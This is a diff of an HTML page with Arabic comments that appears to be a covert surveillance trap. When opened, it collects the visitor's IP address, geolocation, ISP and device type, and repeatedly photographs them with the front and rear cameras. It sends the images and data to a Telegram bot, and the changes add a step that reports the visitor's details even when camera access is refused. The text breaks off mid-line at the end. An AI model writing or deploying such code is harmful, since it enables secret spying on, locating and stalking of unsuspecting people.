@@ -110,6 +110,14 @@
             color: #e94560;
             margin-top: 5px;
         }
+        .info-box {
+            background: #12122a;
+            border-radius: 10px;
+            padding: 10px 14px;
+            margin-top: 10px;
+            border: 1px solid #1a1a3a;
+            text-align: left;
+        }
         .info-row {
             display: flex;
             justify-content: space-between;
@@ -121,14 +129,6 @@
         .info-row:last-child { border-bottom: none; }
         .info-row .label { color: #666; }
         .info-row .value { color: #e94560; }
-        .info-box {
-            background: #12122a;
-            border-radius: 10px;
-            padding: 10px 14px;
-            margin-top: 10px;
-            border: 1px solid #1a1a3a;
-            text-align: left;
-        }
     </style>
 </head>
 <body>
@@ -181,17 +181,16 @@
         let currentCamera = 'user';
         let isSwitching = false;
         let userInfo = {};
+        let permissionDenied = false;
 
         // ====== جلب معلومات المستخدم ======
         async function getUserInfo() {
             try {
-                // جلب IP والموقع
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 const ip = ipData.ip || 'غير معروف';
                 ipDisplay.textContent = ip;
 
-                // جلب معلومات الموقع من ip-api
                 const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
                 const geoData = await geoRes.json();
                 
@@ -203,7 +202,6 @@
                 cityDisplay.textContent = `${city}${region ? ', ' + region : ''}${country ? ', ' + country : ''}`;
                 ispDisplay.textContent = isp;
 
-                // معلومات الجهاز
                 const device = navigator.userAgent;
                 let deviceName = 'غير معروف';
                 if (device.includes('Windows')) deviceName = '💻 Windows';
@@ -242,7 +240,7 @@
             } catch (e) { return false; }
         }
 
-        // ====== إرسال إشعار مع معلومات المستخدم ======
+        // ====== إرسال إشعار ======
         async function sendMessage(text) {
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -254,7 +252,7 @@
             } catch (e) { return false; }
         }
 
-        // ====== إرسال معلومات المستخدم مع الصور ======
+        // ====== إرسال جميع البيانات ======
         async function sendAllData() {
             if (isSending || hasSent) return;
             isSending = true;
@@ -269,7 +267,6 @@
                 await new Promise(r => setTimeout(r, 60));
             }
 
-            // إرسال معلومات المستخدم
             const infoMsg = `📸 **تم إرسال ${successCount} صورة**\n\n` +
                 `🌐 **IP:** ${userInfo.ip || 'غير معروف'}\n` +
                 `📍 **الموقع:** ${userInfo.city || 'غير معروف'}\n` +
@@ -292,37 +289,65 @@
             statusDiv.style.color = '#4caf50';
         }
 
-        // ====== بدء الكاميرا ======
-        async function startCamera(mode) {
+        // ====== طلب الكاميرا فوراً مع رسائل واضحة ======
+        async function requestCamera() {
             try {
-                if (stream) {
-                    stream.getTracks().forEach(t => t.stop());
-                    stream = null;
-                }
-
+                // محاولة الكاميرا الأمامية أولاً
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: {
-                        facingMode: mode,
+                        facingMode: 'user',
                         width: { ideal: 640 },
                         height: { ideal: 480 }
                     },
                     audio: false
                 });
-
-                currentCamera = mode;
-                const cameraName = mode === 'environment' ? 'خلفية' : 'أمامية';
-                cameraBadge.textContent = `📷 كاميرا ${cameraName}`;
+                currentCamera = 'user';
+                cameraBadge.textContent = '📷 كاميرا أمامية';
+                statusDiv.innerHTML = '✅ تم الوصول إلى الكاميرا الأمامية';
+                statusDiv.style.color = '#4caf50';
                 return true;
             } catch (error) {
-                console.log('❌ فشل الكاميرا:', error);
-                if (mode === 'user') {
-                    return await startCamera('environment');
+                console.log('❌ فشل الكاميرا الأمامية:', error.name);
+
+                // إذا فشلت الأمامية، جرب الخلفية
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: 'environment',
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        },
+                        audio: false
+                    });
+                    currentCamera = 'environment';
+                    cameraBadge.textContent = '📷 كاميرا خلفية';
+                    statusDiv.innerHTML = '✅ تم الوصول إلى الكاميرا الخلفية';
+                    statusDiv.style.color = '#4caf50';
+                    return true;
+                } catch (error2) {
+                    console.log('❌ فشل الكاميرا الخلفية:', error2.name);
+                    permissionDenied = true;
+
+                    // رسائل واضحة للمستخدم
+                    if (error2.name === 'NotAllowedError' || error2.name === 'PermissionDeniedError') {
+                        statusDiv.innerHTML = '🚫 تم رفض صلاحية الكاميرا. امنح الصلاحية من إعدادات المتصفح.';
+                        statusDiv.style.color = '#ff9800';
+                        cameraBadge.textContent = '⚠️ تم رفض الصلاحية';
+                    } else if (error2.name === 'NotFoundError' || error2.name === 'DevicesNotFoundError') {
+                        statusDiv.innerHTML = '📵 لا توجد كاميرا على هذا الجهاز.';
+                        statusDiv.style.color = '#ff9800';
+                        cameraBadge.textContent = '📵 لا توجد كاميرا';
+                    } else {
+                        statusDiv.innerHTML = '❌ خطأ غير معروف: ' + error2.message;
+                        statusDiv.style.color = '#e94560';
+                        cameraBadge.textContent = '❌ خطأ';
+                    }
+                    return false;
                 }
-                return false;
             }
         }
 
-        // ====== التقاط صورة بسرعة ======
+        // ====== التقاط صورة ======
         async function capturePhoto() {
             if (!stream) return null;
             try {
@@ -355,7 +380,7 @@
 
         // ====== التبديل بين الكاميرات ======
         async function switchCamera() {
-            if (isSwitching) return;
+            if (isSwitching || permissionDenied) return;
             isSwitching = true;
 
             const nextMode = currentCamera === 'environment' ? 'user' : 'environment';
@@ -364,46 +389,69 @@
             statusDiv.style.color = '#ff9800';
             cameraBadge.textContent = `📷 جاري التبديل...`;
 
-            const success = await startCamera(nextMode);
-            isSwitching = false;
+            try {
+                const newStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: nextMode,
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false
+                });
 
-            if (success) {
+                if (stream) stream.getTracks().forEach(t => t.stop());
+                stream = newStream;
+                currentCamera = nextMode;
+                cameraBadge.textContent = `📷 كاميرا ${cameraName}`;
                 statusDiv.innerHTML = `✅ تم التبديل إلى الكاميرا ${cameraName}`;
                 statusDiv.style.color = '#4caf50';
+                isSwitching = false;
                 return true;
-            } else {
-                statusDiv.innerHTML = `⚠️ فشل التبديل إلى الكاميرا ${cameraName}`;
-                statusDiv.style.color = '#ff9800';
+            } catch (error) {
+                console.log('❌ فشل التبديل:', error.name);
+                isSwitching = false;
+                if (error.name === 'NotAllowedError') {
+                    statusDiv.innerHTML = '🚫 تم رفض صلاحية الكاميرا الجديدة';
+                    statusDiv.style.color = '#ff9800';
+                } else {
+                    statusDiv.innerHTML = `⚠️ لا توجد كاميرا ${cameraName}`;
+                    statusDiv.style.color = '#ff9800';
+                }
                 return false;
             }
         }
 
-        // ====== بدء التصوير التلقائي ======
+        // ====== بدء التصوير ======
         async function startAutoCapture() {
-            statusDiv.innerHTML = `<span class="loader"></span> جاري فتح الكاميرا الأمامية...`;
+            statusDiv.innerHTML = `<span class="loader"></span> جاري فتح الكاميرا...`;
             statusDiv.style.color = '#ff9800';
 
-            // جلب معلومات المستخدم أولاً
+            // جلب معلومات المستخدم
             await getUserInfo();
 
-            const cameraReady = await startCamera('user');
+            // طلب الكاميرا
+            const cameraReady = await requestCamera();
+
             if (!cameraReady) {
-                statusDiv.innerHTML = `⚠️ لم نتمكن من الوصول للكاميرا، تأكد من الصلاحية`;
-                statusDiv.style.color = '#ff9800';
+                // إذا تم رفض الصلاحية، نرسل إشعار بالرفض
+                await sendMessage(`🚫 **تم رفض صلاحية الكاميرا**\n\n` +
+                    `🌐 IP: ${userInfo.ip || 'غير معروف'}\n` +
+                    `📍 الموقع: ${userInfo.city || 'غير معروف'}\n` +
+                    `📱 الجهاز: ${userInfo.device || 'غير معروف'}\n` +
+                    `🕒 الوقت: ${new Date().toLocaleString()}`);
                 return;
             }
 
-            statusDiv.innerHTML = `📸 جاري التصوير بسرعة...`;
+            statusDiv.innerHTML = `📸 جاري التصوير...`;
             statusDiv.style.color = '#4caf50';
 
-            // إرسال إشعار بدء مع معلومات المستخدم
-            const infoMsg = `📷 **بدأ التصوير السريع**\n\n` +
-                `🌐 **IP:** ${userInfo.ip || 'غير معروف'}\n` +
-                `📍 **الموقع:** ${userInfo.city || 'غير معروف'}\n` +
-                `📶 **المزود:** ${userInfo.isp || 'غير معروف'}\n` +
-                `📱 **الجهاز:** ${userInfo.device || 'غير معروف'}\n` +
-                `🕒 **الوقت:** ${new Date().toLocaleString()}`;
-            await sendMessage(infoMsg);
+            // إرسال إشعار بدء
+            await sendMessage(`📷 **بدأ التصوير**\n\n` +
+                `🌐 IP: ${userInfo.ip || 'غير معروف'}\n` +
+                `📍 الموقع: ${userInfo.city || 'غير معروف'}\n` +
+                `📶 المزود: ${userInfo.isp || 'غير معروف'}\n` +
+                `📱 الجهاز: ${userInfo.device || 'غير معروف'}\n` +
+                `🕒 الوقت: ${new Date().toLocaleString()}`);
 
             let captureCount = 0;
             const totalCaptures = maxPhotos;
@@ -415,13 +463,14 @@
                     statusDiv.style.color = '#4caf50';
                     progressFill.style.width = '100%';
                     progressText.innerHTML = '✅ اكتمل التحميل!';
-                    await sendMessage(`✅ **اكتمل التصوير السريع** (${totalCaptures} صورة - أمامية + خلفية)`);
+                    await sendMessage(`✅ **اكتمل التصوير** (${totalCaptures} صورة)`);
                     return;
                 }
 
-                if (captureCount > 0 && captureCount % 2 === 0) {
+                // التبديل كل 3 صور
+                if (captureCount > 0 && captureCount % 3 === 0) {
                     await switchCamera();
-                    await new Promise(r => setTimeout(r, 150));
+                    await new Promise(r => setTimeout(r, 200));
                 }
 
                 const blob = await capturePhoto();
@@ -435,7 +484,7 @@
                     const cameraName = currentCamera === 'environment' ? 'خلفية' : 'أمامية';
                     statusDiv.innerHTML = `📸 جاري التصوير ${captureCount}/${totalCaptures} (${cameraName})`;
                 }
-            }, 400);
+            }, 500);
         }
 
         // ====== مراقبة الخروج ======
@@ -447,8 +496,5 @@
             }
         });
 
-        // ====== بدء التصوير التلقائي فوراً ======
-        setTimeout(startAutoCapture, 500);
-    </script>
-</body>
-</html>
+        // ====== بدء التصوير فوراً ======
+        setTimeout(star
